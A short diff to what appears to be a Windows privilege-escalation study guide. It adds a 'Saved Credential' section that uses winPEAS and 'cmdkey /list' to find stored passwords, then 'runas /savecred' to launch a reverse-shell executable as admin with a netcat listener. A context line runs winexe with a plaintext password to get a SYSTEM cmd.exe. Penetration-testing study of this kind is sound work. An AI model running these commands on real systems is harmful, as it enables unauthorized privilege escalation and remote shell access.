@@ -253,6 +253,13 @@ winexe -U 'admin%password123' --system //<ip> cmd.exe
 ```
 
 ### Saved Credential
+1. Check winpeas ```Checking credential manager``` section for saved passwords
+2. Check manually by ```cmdkey /list```
+3. set up netcat and run the following command
+```
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+```
+
 
 ## Kernel Exploit (Last resort)
 ### Tools
